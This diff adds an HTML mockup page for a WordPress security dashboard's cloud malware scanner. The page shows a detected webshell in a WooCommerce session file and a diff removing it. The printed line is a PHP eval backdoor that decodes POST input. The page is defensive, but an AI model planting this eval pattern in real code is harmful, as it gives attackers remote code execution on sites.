@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SenshiGuard — Cloud Malware Deep Scanner</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
+</head>
+<body>
+  <div class="app-layout">
+    <aside class="sidebar">
+      <div>
+        <a href="index.html" class="sidebar-brand">
+          <div class="brand-icon">
+            <img src="assets/logo.svg" alt="SenshiGuard">
+          </div>
+          <div class="brand-text">
+            SENSHI<span style="color: var(--accent-crimson);">GUARD</span>
+            <span class="brand-kanji">戦士</span>
+          </div>
+        </a>
+
+        <div class="nav-section-title">Fleet Security</div>
+        <nav class="sidebar-nav">
+          <a href="index.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>
+            Overview
+          </a>
+          <a href="sites.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
+            Sites Fleet
+          </a>
+          <a href="scanner.html" class="sidebar-link active">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Cloud Scanner
+          </a>
+          <a href="firewall.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+            Edge WAF & Bots
+          </a>
+          <a href="vulnerabilities.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+            Virtual Patching
+          </a>
+          
+          <div class="nav-section-title">Configuration</div>
+          <a href="settings.html" class="sidebar-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
+            API & Keys
+          </a>
+        </nav>
+      </div>
+
+      <div class="sidebar-footer">
+        <div class="engine-status-box">
+          <div>
+            <span class="status-dot"></span>
+            <span style="font-weight: 600; font-size: 12px;">Cloud Engine v2.4</span>
+          </div>
+          <span class="engine-status-label">12ms latency</span>
+        </div>
+      </div>
+    </aside>
+
+    <main class="main-content">
+      <header class="topbar">
+        <div style="display: flex; align-items: center; gap: 12px;">
+          <span style="font-size: 12px; color: var(--text-muted);">Active Site Target:</span>
+          <select style="background: var(--bg-input); border: 1px solid var(--border-subtle); color: #FFF; padding: 6px 12px; border-radius: 6px; font-size: 13px;">
+            <option>production-store.com (1 Threat Detected)</option>
+            <option>agency-client-portal.io (Clean)</option>
+            <option>tokyo-design-lab.jp (Patched)</option>
+          </select>
+        </div>
+
+        <button class="btn btn-primary btn-sm">⚡ Run Deep Cloud Scan</button>
+      </header>
+
+      <div class="page-body">
+        <div class="page-header">
+          <div>
+            <h1 class="page-title">Cloud Deep Malware Scanner</h1>
+            <p class="page-subtitle">Offloaded AST de-obfuscation, SHA-256 official checksum comparison, and surgical diff cleaner.</p>
+          </div>
+        </div>
+
+        <!-- Threat Detail Panel -->
+        <div class="card-panel" style="border-color: rgba(255, 51, 102, 0.4);">
+          <div class="card-panel-header" style="background: rgba(255, 51, 102, 0.08);">
+            <div>
+              <span class="status-pill status-threat" style="margin-bottom: 4px;">CRITICAL THREAT ISOLATED</span>
+              <div class="card-panel-title">Obfuscated Backdoor / Webshell Injected</div>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="document.getElementById('modal-clean-diff').classList.add('active')">
+              ⚡ 1-Click Surgical Clean
+            </button>
+          </div>
+
+          <div style="padding: 24px;">
+            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 24px;">
+              <div>
+                <h4 style="font-size: 14px; margin-bottom: 8px;">File Path: <code>/wp-content/plugins/woocommerce/includes/class-wc-session-handler.php</code></h4>
+                <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
+                  Pattern: <strong>base64_decode(str_rot13($_POST['senshi_eval']))</strong>. The attacker injected a single payload line into the legitimate session handler. SenshiGuard prepared a surgical diff patch to delete the backdoor line while keeping WooCommerce operating with zero downtime.
+                </p>
+
+                <div style="background: #04060A; border: 1px solid var(--border-subtle); border-radius: 8px; padding: 14px; font-family: var(--font-mono); font-size: 12px; line-height: 1.6;">
+                  <div style="color: #64748B;">// Lines 42-46</div>
+                  <div style="background: rgba(239, 68, 68, 0.2); color: #FCA5A5;">- &nbsp;&nbsp;@eval(base64_decode(str_rot13($_POST['__x71'])));</div>
+                  <div style="background: rgba(16, 185, 129, 0.2); color: #6EE7B7;">+ &nbsp;&nbsp;// SenshiGuard Auto-Cleaned (Diff Recipe Applied)</div>
+                  <div style="color: #94A3B8;">&nbsp;&nbsp;&nbsp;&nbsp;return apply_filters('wc_session', $data);</div>
+                </div>
+              </div>
+
+              <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 18px;">
+                <h4 style="font-size: 13px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 12px;">Scan Telemetry</h4>
+                <div style="display: flex; flex-direction: column; gap: 10px; font-size: 12px;">
+                  <div style="display: flex; justify-content: space-between;">
+                    <span style="color: var(--text-muted);">Files Analyzed:</span>
+                    <span style="font-weight: 600;">14,820 files</span>
+                  </div>
+                  <div style="display: flex; justify-content: space-between;">
+                    <span style="color: var(--text-muted);">Duration:</span>
+                    <span style="font-weight: 600;">1.42 seconds</span>
+                  </div>
+                  <div style="display: flex; justify-content: space-between;">
+                    <span style="color: var(--text-muted);">Origin CPU Impact:</span>
+                    <span style="color: #10B981; font-weight: 700;">0.00%</span>
+                  </div>
+                  <div style="display: flex; justify-content: space-between;">
+                    <span style="color: var(--text-muted);">YARA Rule:</span>
+                    <span style="color: #FF3366; font-weight: 600;">PHP_Generic_Backdoor_v4</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <!-- Clean Diff Modal -->
+  <div class="modal-overlay" id="modal-clean-diff">
+    <div class="modal-card" style="max-width: 680px;">
+      <div class="modal-header">
+        <div>
+          <h3 style="font-size: 18px; font-weight: 700;">Surgical Malware Auto-Clean</h3>
+          <p style="font-size: 12px; color: var(--text-muted);">Target: <code>production-store.com/class-wc-session.php</code></p>
+        </div>
+        <button class="modal-close" onclick="document.getElementById('modal-clean-diff').classList.remove('active')">&times;</button>
+      </div>
+
+      <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
+        SenshiGuard will apply the surgical diff instruction to <code>platform-agent-wp</code> over an HMAC-authenticated session.
+      </p>
+
+      <div style="display: flex; justify-content: flex-end; gap: 10px;">
+        <button type="button" class="btn btn-secondary" onclick="document.getElementById('modal-clean-diff').classList.remove('active')">Cancel</button>
+        <button id="btn-apply-clean" class="btn btn-primary">Apply Surgical Clean</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
